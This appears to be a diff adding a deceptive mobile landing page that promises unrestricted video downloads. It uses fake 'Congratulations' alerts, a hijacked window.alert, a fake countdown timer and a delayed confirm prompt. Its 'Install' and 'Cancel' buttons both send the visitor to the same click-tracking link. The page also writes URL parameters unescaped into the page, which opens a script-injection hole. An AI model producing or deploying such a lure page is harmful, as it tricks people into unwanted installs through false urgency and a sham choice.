@@ -1,0 +1,916 @@
+<!DOCTYPE html><html><head>
+  <base href="">
+
+  
+
+    <title>Proxy browser.</title>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#999">
+
+    <style type="text/css">html {
+        font-family: sans-serif;
+        -ms-text-size-adjust: 100%;
+        -webkit-text-size-adjust: 100%
+    }
+
+    body {
+        margin: 0
+    }
+
+    article, aside, details, figcaption, figure, footer, header, hgroup, main, menu, nav, section, summary {
+        display: block
+    }
+
+    audio, canvas, progress, video {
+        display: inline-block;
+        vertical-align: baseline
+    }
+
+    audio:not([controls]) {
+        display: none;
+        height: 0
+    }
+
+    [hidden], template {
+        display: none
+    }
+
+    a {
+        background-color: transparent
+    }
+
+    a:active, a:hover {
+        outline: 0
+    }
+
+    abbr[title] {
+        border-bottom: 1px dotted
+    }
+
+    b, strong {
+        font-weight: 700
+    }
+
+    dfn {
+        font-style: italic
+    }
+
+    h1 {
+        font-size: 2em;
+        margin: .67em 0
+    }
+
+    mark {
+        background: #ff0;
+        color: #000
+    }
+
+    small {
+        font-size: 80%
+    }
+
+    sub, sup {
+        font-size: 75%;
+        line-height: 0;
+        position: relative;
+        vertical-align: baseline
+    }
+
+    sup {
+        top: -.5em
+    }
+
+    sub {
+        bottom: -.25em
+    }
+
+    img {
+        border: 0
+    }
+
+    svg:not(:root) {
+        overflow: hidden
+    }
+
+    figure {
+        margin: 1em 40px
+    }
+
+    hr {
+        -moz-box-sizing: content-box;
+        box-sizing: content-box;
+        height: 0
+    }
+
+    pre {
+        overflow: auto
+    }
+
+    code, kbd, pre, samp {
+        font-family: monospace, monospace;
+        font-size: 1em
+    }
+
+    button, input, optgroup, select, textarea {
+        color: inherit;
+        font: inherit;
+        margin: 0
+    }
+
+    button {
+        overflow: visible
+    }
+
+    button, select {
+        text-transform: none
+    }
+
+    button, html input[type=button], input[type=reset], input[type=submit] {
+        -webkit-appearance: button;
+        cursor: pointer
+    }
+
+    button[disabled], html input[disabled] {
+        cursor: default
+    }
+
+    button::-moz-focus-inner, input::-moz-focus-inner {
+        border: 0;
+        padding: 0
+    }
+
+    input {
+        line-height: normal
+    }
+
+    input[type=checkbox], input[type=radio] {
+        box-sizing: border-box;
+        padding: 0
+    }
+
+    input[type=number]::-webkit-inner-spin-button, input[type=number]::-webkit-outer-spin-button {
+        height: auto
+    }
+
+    input[type=search] {
+        -webkit-appearance: textfield;
+        -moz-box-sizing: content-box;
+        -webkit-box-sizing: content-box;
+        box-sizing: content-box
+    }
+
+    input[type=search]::-webkit-search-cancel-button, input[type=search]::-webkit-search-decoration {
+        -webkit-appearance: none
+    }
+
+    fieldset {
+        border: 1px solid silver;
+        margin: 0 2px;
+        padding: .35em .625em .75em
+    }
+
+    legend {
+        border: 0;
+        padding: 0
+    }
+
+    textarea {
+        overflow: auto
+    }
+
+    optgroup {
+        font-weight: 700
+    }
+
+    table {
+        border-collapse: collapse;
+        border-spacing: 0
+    }
+
+    td, th {
+        padding: 0
+    }</style>
+
+    <style type="text/css">
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: auto;
+            height: 100%;
+        }
+
+        body {
+            font-family: -apple-system, "Roboto", Trebuchet MS, sans-serif;
+            font-size: 0.85em;
+            line-height: 1.2em;
+            color: #000;
+            background-color: #808080;
+        }
+
+        a, img {
+            border: 0;
+            outline: none;
+        }
+
+        a {
+            color: #ffa31a;
+            text-decoration: none;
+        }
+
+        h1, p {
+            margin: 0;
+            padding: 0;
+        }
+
+        h1 {
+            margin-bottom: 9px;
+            font-weight: bold;
+            font-size: 127%;
+            line-height: 100%;
+        }
+
+        .wrap {
+            position: relative;
+            margin: 0 auto;
+            width: auto;
+            min-width: 240px;
+            max-width: 100%;
+            height: 100%;
+            min-height: 240px;
+            overflow: hidden;
+
+            background-position: center top;
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+
+        .pagelink {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            width: auto;
+            height: auto;
+        }
+
+        .description {
+            position: absolute;
+            left: 5px;
+            right: 5px;
+            top: 5px;
+            bottom: 5px;
+            color: #000;
+            text-align: left;
+            white-space: normal;
+            overflow: hidden;
+        }
+
+        .window {
+            position: absolute;
+            left: 0;
+            right: 0;
+            top: 50%;
+            width: 84.4%;
+            min-width: 240px;
+            max-width: 320px;
+            margin: auto;
+            /*text-align: center;*/
+            border-radius: 12px;
+            background-color: #292929;
+
+            -webkit-transform: translate(0, -50%);
+            -moz-transform: translate(0, -50%);
+            transform: translate(0, -50%);
+        }
+
+        .text {
+            margin: 7.6% 7% 8% 7%;
+            color: #ffffff;
+        }
+
+        .buttons, .button {
+            margin: 0;
+            text-align: center;
+        }
+
+        .buttons {
+            position: relative;
+            height: auto;
+            min-height: 45px;
+            color: #1275ec;
+            font-weight: bold;
+            font-size: 130%;
+            border-top: 1px solid #b4b4b4;
+            white-space: nowrap;
+        }
+
+        .buttons:after {
+           /* content: "";*/
+            display: block;
+            position: absolute;
+            left: 50%;
+            top: 0;
+            bottom: 0;
+            width: 0;
+            height: auto;
+            font-size: 0;
+            line-height: 0;
+            border: 0;
+            border-left: 1px solid #b4b4b4;
+            overflow: hidden;
+        }
+
+        .button {
+            display: inline-block;
+
+            margin: 0px auto;
+            padding: 15px 3%;
+            width: 43%;
+            color: #ffa31a;
+            text-align: center;
+            white-space: normal;
+        }
+
+        @supports (display: -webkit-box) or (display: -moz-box) or (display: -webkit-flex) or (display: flex) {
+            .buttons, .button {
+                display: -webkit-box;
+                display: -moz-box;
+                display: -webkit-flex;
+                display: flex;
+
+                -webkit-flex-direction: row;
+                -moz-flex-direction: row;
+                flex-direction: row;
+
+                -webkit-flex-wrap: nowrap;
+                -moz-flex-wrap: nowrap;
+                flex-wrap: nowrap;
+
+                -webkit-justify-content: space-between;
+                -moz-justify-content: space-between;
+                justify-content: space-between;
+
+                -webkit-align-items: stretch;
+                -moz-flex-align: stretch;
+                align-items: stretch;
+
+                -webkit-align-content: stretch;
+                -moz-flex-line-pack: stretch;
+                align-content: stretch;
+
+                -webkit-box-align: stretch;
+                -moz-box-align: stretch;
+                box-align: stretch;
+
+                -webkit-box-pack: center;
+                -moz-box-pack: center;
+                box-pack: center;
+
+                -webkit-box-direction: normal;
+                -moz-box-direction: normal;
+                box-direction: normal;
+
+                -webkit-box-orient: vertical;
+                -moz-box-orient: vertical;
+                box-orient: vertical;
+            }
+
+            .button {
+                -webkit-flex-direction: column;
+                -moz-flex-direction: column;
+                flex-direction: column;
+
+                -webkit-justify-content: center;
+                -moz-justify-content: center;
+                justify-content: center;
+            }
+
+            .button span {
+                -webkit-box-flex: 0 1 auto;
+                -moz-box-flex: 0 1 auto;
+                -webkit-flex: 0 1 auto;
+                flex: 0 1 auto;
+
+                -webkit-order: 0;
+                -moz-order: 0;
+                order: 0;
+            }
+        }
+
+        /* ************************************************************************* */
+
+        @media screen and (orientation: portrait) and (max-width: 450px) {
+            h1 {
+                margin-bottom: 2px;
+                line-height: 106%;
+            }
+
+            .text {
+                margin: 7.5% 6.7% 8% 6.7%;
+            }
+        }
+
+        @media screen and (orientation: portrait) and (max-width: 400px) {
+            h1 {
+                margin-bottom: 3px;
+                font-size: 128%;
+                line-height: 112%;
+            }
+
+            .text {
+                margin: 7.4% 6.4% 8% 6.4%;
+            }
+        }
+
+        @media screen and (orientation: portrait) and (max-width: 375px) {
+            h1 {
+                margin-bottom: 4px;
+                line-height: 118%;
+            }
+
+            .text {
+                margin: 7.3% 6.1% 8% 6.1%;
+            }
+
+            .buttons {
+                min-height: 49px;
+            }
+        }
+
+        @media screen and (orientation: portrait) and (max-width: 350px) {
+            h1 {
+                margin-bottom: 5px;
+                font-size: 129%;
+                line-height: 124%;
+            }
+
+            .text {
+                margin: 7.2% 5.8% 8% 5.8%;
+            }
+
+            .buttons {
+                min-height: 46px;
+            }
+        }
+
+        @media screen and (orientation: portrait) and (max-width: 325px) {
+            body {
+                font-size: 0.84em;
+            }
+
+            h1 {
+                margin-bottom: 6px;
+                font-size: 130%;
+                line-height: 130%;
+            }
+
+            .text {
+                margin: 7% 5.6% 8% 5.6%;
+            }
+
+            .buttons {
+                min-height: 41px;
+            }
+
+            .button {
+                line-height: 65%;
+            }
+        }
+
+        @media screen and (orientation: portrait) and (max-width: 300px) {
+            body {
+                font-size: 0.77em;
+            }
+        }
+
+        @media screen and (orientation: portrait) and (max-width: 275px) {
+            body {
+                font-size: 0.7em;
+            }
+        }
+
+        @media screen and (orientation: portrait) and (max-width: 250px) {
+            body {
+                font-size: 0.63em;
+            }
+        }
+
+        /* ************************************************************************* */
+
+        @media screen and (orientation: landscape) and (max-height: 450px) {
+            h1 {
+                margin-bottom: 2px;
+                line-height: 106%;
+            }
+
+            .text {
+                margin: 6.5% 7% 7% 7%;
+            }
+        }
+
+        @media screen and (orientation: landscape) and (max-height: 400px) {
+            h1 {
+                margin-bottom: 3px;
+                font-size: 128%;
+                line-height: 112%;
+            }
+
+            .text {
+                margin: 5.5% 7% 6% 7%;
+            }
+        }
+
+        @media screen and (orientation: landscape) and (max-height: 375px) {
+            h1 {
+                margin-bottom: 4px;
+                line-height: 118%;
+            }
+
+            .text {
+                margin: 4.5% 7% 5% 7%;
+            }
+
+            .buttons {
+                min-height: 49px;
+            }
+        }
+
+        @media screen and (orientation: landscape) and (max-height: 350px) {
+            h1 {
+                margin-bottom: 5px;
+                font-size: 129%;
+                line-height: 124%;
+            }
+
+            .text {
+                margin: 3.5% 7% 4% 7%;
+            }
+
+            .buttons {
+                min-height: 46px;
+            }
+        }
+
+        @media screen and (orientation: landscape) and (max-height: 325px) {
+            body {
+                font-size: 0.84em;
+            }
+
+            h1 {
+                margin-bottom: 6px;
+                font-size: 130%;
+                line-height: 130%;
+            }
+
+            .text {
+                margin: 2.5% 7% 3% 7%;
+            }
+
+            .buttons {
+                min-height: 41px;
+            }
+
+            .button {
+                line-height: 65%;
+            }
+        }
+
+        @media screen and (orientation: landscape) and (max-height: 300px) {
+            body {
+                font-size: 0.77em;
+            }
+        }
+
+        @media screen and (orientation: landscape) and (max-height: 275px) {
+            body {
+                font-size: 0.7em;
+            }
+        }
+
+        @media screen and (orientation: landscape) and (max-height: 250px) {
+            body {
+                font-size: 0.63em;
+            }
+        }
+
+        .blink_me {
+            animation: blinker 1s linear infinite;
+        }
+
+        @keyframes blinker {
+            50% { opacity: 1; color: #ffa31a; }
+        }
+	.cancel{
+		color: #999 !important;
+		border-left: 1px solid #aaa;
+		font-weight: 400;
+	}
+/*dialog*/
+#myModal{
+    position: fixed;
+    top: 0px;
+    width: 100%;
+	display:none;
+	z-index:100;
+}
+.w3-animate-top{
+	position:relative;
+	animation:animatetop 0.4s
+	margin: 3px;
+    box-shadow: 0px 2px 4px 0px #9d9d9d;
+}
+
+@keyframes animatetop{from{top:-300px;opacity:0} to{top:0;opacity:1}}
+.w3-card-4, .w3-hover-shadow:hover {
+
+}
+.modal-body{
+	box-sizing: border-box;
+    max-width: 100%;
+    margin: 0 auto;
+    box-shadow: 0 0 20px 3px rgba(0,0,0,.22)!important;
+    background: #fff!important;
+    padding: 1.286em;
+    border-bottom-left-radius: 2px;
+    border-bottom-right-radius: 2px;
+    font-family: Roboto,Noto,Helvetica Neue,Helvetica,Arial,sans-serif;
+}
+.clearfix{display:block;-webkit-backface-visibility:initial!important;backface-visibility:initial!important}
+.popover-footer{
+	margin-top:1em;
+}
+
+    #modalContainer {
+    background-color:rgba(0, 0, 0, 0.7);
+    position:absolute;
+    top:0;
+    width:100%;
+    height:100%;
+    left:0px;
+    z-index:10000;
+    display: flex;
+    justify-content: center;
+  }
+
+  #alertBox {
+    position:relative;
+    width:330px;
+    min-height:100px;
+    max-height:400px;
+    top: calc(50% - 100px);
+    border:1px solid #fff;
+    background-color:#fff;
+    background-repeat:no-repeat;
+    border: none;
+    border-radius: 5px;
+    transform: translate3d(0, 0, 0);
+    backface-visibility: hidden;
+    animation-name: shake;
+    animation-duration: 5s; /*Время полной анимации с задержкой*/
+    animation-iteration-count: 1;
+    animation-timing-function: linear;
+  }
+
+  /* Чтобы поменять скорость нужно каждый процент у множить на некий кооф.
+  Например, чтобы уменьшить скорость в 2р нужно каждый % умножить на 2*/
+  @keyframes shake {
+     1%, 9% { /*2%, 18%*/
+          transform: translate3d(-5px, 0, 0);
+      }
+
+      2%, 8% { /*4%, 16%*/
+          transform: translate3d(5px, 0, 0);
+      }
+
+      3%, 5%, 7% { /*6%, 10%, 14%*/
+          transform: translate3d(-5px, 0, 0);
+      }
+
+      4%, 6% { /*8%, 12%*/
+          transform: translate3d(5px, 0, 0);
+      }
+
+      9.05% { /*18.1*/
+          transform: translate3d(0px, 0, 0);
+      }
+  }
+
+  #modalContainer > #alertBox {
+    position:fixed;
+  }
+
+  #alertBox h1 {
+    margin:0;
+    font-family:Raleway,arial;
+    font-size: 20px
+    font-weight: 200;
+    color:black;
+    padding:20px 30px;
+    border-top-left-radius: 5px;
+    border-top-right-radius: 5px;
+  }
+
+  #alertBox p {
+    padding:0 30px;
+    vertical-align:middle;
+    line-height: 1.5;
+    color: grey;
+  }
+
+  #alertBox #closeBtn {
+    display:block;
+    float: right;
+    position:relative;
+    margin: 20px 20px 10px 0;
+    padding:7px;
+    border:0 none;
+    width:70px;
+    text-transform:uppercase;
+    text-align:center;
+    color: #368acc;
+    border-radius: 0px;
+    text-decoration:none;
+    outline:0!important;
+  }
+
+
+  #mContainer {
+    position:relative;
+    width:600px;
+    margin:auto;
+    padding:5px;
+    border-top:2px solid #fff;
+    border-bottom:2px solid #fff;
+  }
+/*dialog*/
+    </style>
+
+    <script>
+
+        function contains(string, fragment) {
+            string = string.toLowerCase();
+            fragment = fragment.toLowerCase();
+            return string.indexOf(fragment) !== -1;
+        }
+
+        function getURLParameter(name) {
+            var result = decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+
+            if(name.indexOf('brand') !== -1 && contains(result, 'generic')) {
+                result = 'Phone'
+            }
+
+            if(name.indexOf('dname') !== -1 && contains(result, 'android')) {
+                result = 'Phone'
+            }
+
+            if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
+                result = 'Internet Browser'
+            }
+
+            return result;
+
+        }
+
+    </script>
+<script type="text/javascript">
+
+var ALERT_TITLE = "Congratulations!";
+var ALERT_TEXT = "One-time unique opportunity for " + getURLParameter("browser_name") +" users.";
+var ALERT_BUTTON_TEXT = "Ok";
+
+var ALERT_TITLE_BACK = "Congratulations!";
+var ALERT_BUTTON_TEXT_BACK = "Ok";
+var ALERT_TEXT_BACK = "One-time unique opportunity for " + getURLParameter("browser_name") +" users.";
+
+function getRandomInt(min, max)
+{
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+function func() {
+    var nv = navigator;
+    var answer = confirm ("One-time unique opportunity for " + getURLParameter("browser_name") +" users.");
+}
+
+setTimeout(func, getRandomInt(120,220)*1000);
+
+    if(document.getElementById) {
+      window.alert = function(txt) {
+        createCustomAlert(txt);
+      }
+    }
+
+    function createCustomAlert(txt) {
+      d = document;
+
+      if(d.getElementById("modalContainer")) return;
+
+      mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
+      mObj.id = "modalContainer";
+      mObj.style.height = d.documentElement.scrollHeight + "px";
+
+      alertObj = mObj.appendChild(d.createElement("div"));
+      alertObj.id = "alertBox";
+      // if(d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
+      // alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth)/2 + "px";
+      alertObj.style.visiblity="visible";
+
+      h1 = alertObj.appendChild(d.createElement("h1"));
+      h1.appendChild(d.createTextNode(ALERT_TITLE));
+
+      msg = alertObj.appendChild(d.createElement("p"));
+      //msg.appendChild(d.createTextNode(txt));
+      msg.innerHTML = txt;
+
+      btn = alertObj.appendChild(d.createElement("a"));
+      btn.id = "closeBtn";
+      btn.appendChild(d.createTextNode(ALERT_BUTTON_TEXT));
+      btn.href = "#";
+      btn.focus();
+      btn.onclick = function() { removeCustomAlert();return false; }
+      document.querySelector('#modalContainer').onclick = function() { removeCustomAlert();return false; }
+
+      alertObj.style.display = "block";
+
+    }
+
+    function removeCustomAlert() {
+      document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
+    }
+    window.addEventListener('load', ()=>{alert(ALERT_TEXT)})
+
+//setTimeout(func, getRandomInt(5,10)*1000);
+
+</script>
+
+
+</head>
+<body class="en ltr">
+
+	<script language="JavaScript" type="text/javascript">
+
+	function hidem(){
+		var modal = document.getElementById("myModal");
+		modal.style.display = "none";
+	}
+	var sec = 59; // set the seconds
+	var min = 05; // set the minutes
+	function countDown() {
+	sec--;
+	if (sec == -01) {
+	sec = 59;
+	min = min - 1; }
+	else {
+	min = min; }
+
+	if (sec<=9) { sec = "0" + sec; }
+
+	time = (min<=9 ? "" + min : min) + " minutes " + sec + " seconds";
+
+	if (document.getElementById) { document.getElementById('theTime').innerHTML = time; }
+
+	SD=window.setTimeout("countDown();", 1000);
+	if (min == '00' && sec == '00') { sec = "00"; window.clearTimeout(SD); }
+	}
+	window.onload = countDown;
+
+</script>
+
+<div class="wrap">
+    <div class="window">
+        <div class="text">
+
+
+            <h1 class="blink_me">Watch and download any video without restrictions in <span style="background-color: #ffa31a; color: #1b1b1b"><script>document.write(getURLParameter("country"))</script>Singapore</span>!</h1>
+            <p>Congratulations! One-time unique opportunity for <script>document.write(getURLParameter("browser_name"))</script>Chrome Mobile users.</p>
+            <br>
+            <a href="https://krmnk.com/click.php?lp=1"><img src="logo.png" style="width:200px;height:200px;display: block;margin-left: auto;margin-right: auto;"></a>
+            <br>
+            <p style="text-align: center;">Are you still looking for a way to save your favorite videos to your phone?<br> You are one of lucky users. Hurry up download for free!</p>
+            <p style="text-align:center;margin-top:10px;"><span style="font-size:15px;color:#ffa31a;font-family:sans-serif;" id="theTime">5 minutes 29 seconds</span></p>
+        </div>
+        <div class="buttons">
+            <a class="button exitpoint" href="https://krmnk.com/click.php?lp=1">
+				<span>Install</span>
+            </a>
+            <a class="button cancel" href="https://krmnk.com/click.php?lp=1">
+				<span>Cancel</span>
+            </a>
+        </div>
+    </div>
+	<form style="visibility:collapse;"><textarea name="comment"></textarea></form>
+</div>
+
+
+
+<script>
+
+    function goto() {
+      //  window[obu] = null;
+        location.href = "https://krmnk.com/click.php?lp=1"
+    }
+</script>
+</body></html>
